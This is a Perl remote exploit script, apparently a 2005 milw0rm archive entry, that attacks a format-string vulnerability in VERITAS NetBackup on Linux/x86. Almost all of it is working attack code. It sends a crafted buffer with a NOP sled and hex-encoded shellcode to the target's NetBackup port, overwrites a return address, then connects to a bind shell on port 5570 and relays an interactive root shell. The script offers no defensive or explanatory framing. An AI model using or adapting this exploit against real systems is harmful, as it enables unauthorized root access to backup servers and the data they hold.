#!/usr/bin/perl
##############################################################
# VERITAS-Linux.pl - VERITAS NetBackup Format Strings Linux/x86 Remote Exploit
# johnh[at]digitalmunition[dot]com
# bug found by kf_lists[at]digitalmunition[dot]com
# http://www.digitalmunition.com/
##############################################################

use POSIX;
use IO::Socket;
use IO::Select;
use strict;

print STDERR "\nveritas.pl - VERITAS NetBackup Format Strings Linux/x86 Remote Exploit\n";

if ($#ARGV == -1) {
        print "Usage:\n\t$0 <hostname> <port>\n\n";
        exit (1);
}

my $hostName = $ARGV[0];
my $port = $ARGV[1] || 13722;

buildexploit ($hostName, $port);

my $shellport = 5570;
print "[*] Connect to remote shell port\n";
my $sock = IO::Socket::INET->new (
                Proto => "tcp",
                PeerAddr => $hostName,
                PeerPort => $shellport,
                Type => SOCK_STREAM
);

if (! $sock)
{
        print "[*] Error, Seems Failed\n";
        exit (0);
}

print "[*] G0t R00T\n";

StartShell ($sock);

sub buildexploit
{
		my ($host, $port) = @_;
		my $s = IO::Socket::INET->new (
                	Proto => "tcp",
                	PeerAddr => $host,
               	 	PeerPort => $port,
                	Type => SOCK_STREAM
		);
				
		if (! $s)
		{
		        print "[*] Could not create socket: $!\n";
				        exit(0);
		}
				
		print $s " 118      1\nOWNED BABY\n";
		print scalar <$s>;
		print scalar <$s>;

		my $shellcode = "\x90" x 500 .
		"\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x16\x81\x73\x17\x13\x99".
		"\x37\xe2\x83\xeb\xfc\xe2\xf4\x22\x42\xc0\x01\xa3\xff\x64\xa1\x40".
		"\xda\x64\x6b\xf2\xd2\xfa\x62\x9a\x5e\x65\x84\x7b\x8c\xf5\xa1\x75".
		"\xca\xbe\x03\xa3\x89\x67\xb3\x44\x10\xd6\x52\x75\x54\xb7\x52\x75".
		"\x2a\x33\x2f\x93\xc9\x67\xb5\x9a\x78\x74\x52\x75\x54\xb7\x6b\xca".
		"\x10\xf4\x52\x2c\xd0\xfa\x62\x52\x7b\xcf\xb3\x7b\xf7\x18\x91\x7b".
		"\xf1\x18\xcd\x71\xf0\xbe\x01\x42\xca\xbe\x03\xa3\x92\xfa\x62";
		my $retloc = 0x080b50ec; #0x080b53b4;
		my $retaddr = 0x80e0658; # can't use shellcode in stack.
		my $hi = ($retaddr >> 0) & 0xffff;
		my $lo = ($retaddr >> 16) & 0xffff;
				
				
		$hi = $hi - 0x28;
		$lo = (0x10000 + $lo + 0x28) - $hi - 0x50;		
				
		my $align = 3;
		my $buffer = " 101      6\n" . "a" x $align . pack ('l', $retloc) .  pack ('l', $retloc + 2) .
		"%." . $hi . "lx" . "%1694\$hn" .
		"%." . $lo . "lx" . "%1695\$hn" .
		$shellcode . "\n" .
		$shellcode . "\n" .
		"i\n" . "0wned\n" . "y0u\n".
		"boot.ini\n" . "\n";
				
		print STDERR "Sending " .length($buffer) . " bytes to remote\n";		
		sleep (10);				
		print $s $buffer;
		print scalar <$s>;		
				
		close $s;
}

sub StartShell 
{
        my ($client) = @_;	
	my $sel = IO::Select->new();
				
					
	# unbuffered fun.
				
				
	Unblock(*STDIN);			
	Unblock(*STDOUT);
	Unblock($client);
				
	select($client); $|++;
	select(STDIN);   $|++;
	select(STDOUT);  $|++;
				
	$sel->add($client);
	$sel->add(*STDIN);
				
	while (fileno($client))
	{		
		my $fd;
		my @fds = $sel->can_read(1);
				
		foreach $fd (@fds)
		{
			my $in = <$fd>;
			if (! $in || ! $fd || ! $client)
			{
				print "[*] Closing connection.\n";
				close($client);
				exit(0);            
			}
				
			if ($fd eq $client)
		        {
				print STDOUT $in;
				} else {
					print $client $in;
				}
			}
		}
		close ($client);
		exit (0);
}

sub Unblock {
        my $fd = shift;
        my $flags;
        $flags = fcntl($fd,F_GETFL,0) || die "Can't get flags for file handle: $!\n";
        fcntl($fd, F_SETFL, $flags|O_NONBLOCK) || die "Can't make handle nonblocking: $!\n";
}

# milw0rm.com [2005-10-20]
